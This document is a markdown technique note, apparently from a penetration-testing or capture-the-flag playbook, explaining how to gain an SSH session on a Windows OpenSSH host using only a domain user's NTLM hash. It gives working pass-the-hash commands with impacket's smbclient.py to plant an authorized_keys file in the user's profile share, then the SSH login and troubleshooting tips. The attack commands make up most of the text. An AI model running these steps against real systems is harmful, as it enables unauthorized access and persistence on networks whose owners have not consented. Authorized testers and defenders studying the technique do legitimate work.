# Windows OpenSSH Login via SMB-Writable Home Profile

## When this applies

- You have a domain user's NTLM hash (e.g., from PtH spray off WIM-extracted SAM).
- That user's password is uncrackable (not in rockyou or rules), so SSH password auth is closed.
- The DC/server runs OpenSSH for Windows and exposes the user-profiles directory (`users` share or `C:\Users`) writable to each user's own profile.
- Goal: convert NTLM hash → interactive SSH session without cracking the password.

## Technique

OpenSSH for Windows honors per-user `%USERPROFILE%\.ssh\authorized_keys` (config `Match Group administrators` overrides this for admins, but normal domain users use the user-profile path). With SMB write access to your own `Users\<you>\` you can drop a public key and login via SSH key auth — entirely bypassing the password requirement.

## Steps

```bash
# 1. Confirm SMB write to own profile
smbclient.py 'domain/user@target' -hashes ':<NTLM>' <<'EOF'
use users
cd <your_username>
mkdir .ssh
EOF
# If "STATUS_OBJECT_NAME_COLLISION" → already exists. If created → write OK.

# 2. Generate a key and upload authorized_keys
ssh-keygen -t ed25519 -N '' -f ~/.ssh/target-id -C 'engagement'
cp ~/.ssh/target-id.pub /tmp/authorized_keys
smbclient.py 'domain/user@target' -hashes ':<NTLM>' <<'EOF'
use users
cd <your_username>\.ssh
lcd /tmp
put authorized_keys
EOF

# 3. SSH in
chmod 600 ~/.ssh/target-id
ssh -i ~/.ssh/target-id user@target
# Output: domain\user
```

## Verifying success

- `ssh -i key user@target whoami` → `domain\username`. Note: command separators are CMD-style (no `;`).

## Common pitfalls

- **The "users" share != local C:\Users** — `users` is a separate exposed share that maps to `C:\Users`. Path segments use backslashes in SMB clients (`use users`, `cd profile\.ssh`).
- **`authorized_keys` in `C:\ProgramData\ssh\administrators_authorized_keys` is for admins only** — don't drop your key there from a non-admin context, OpenSSH will reject it.
- **Each user's `Users\<their_dir>` only writable to themselves** — SMB ACL mirrors NTFS. You can drop into your own profile but not another user's.
- **OpenSSH config `Match Group administrators` exists on Windows** — for users in the local `Administrators` group the key path becomes `C:\ProgramData\ssh\administrators_authorized_keys` (not their profile). For domain regular users, profile-based auth always works.
- **SSH "Permission denied (publickey,password,keyboard-interactive)"** — verify the key is named `authorized_keys` (not `authorized_keys.pub`), permissions inside SMB don't matter (Windows side), but on attacker side `chmod 600` the private key.
- **CMD shell on box** — `ssh user@target 'whoami; hostname'` fails with `Invalid argument/option - ';'`. Use one command per ssh call, or wrap with `cmd /c "..." `.

## Tools

- impacket `smbclient.py` (or `smbclient` from samba-utils)
- `ssh-keygen` + OpenSSH client
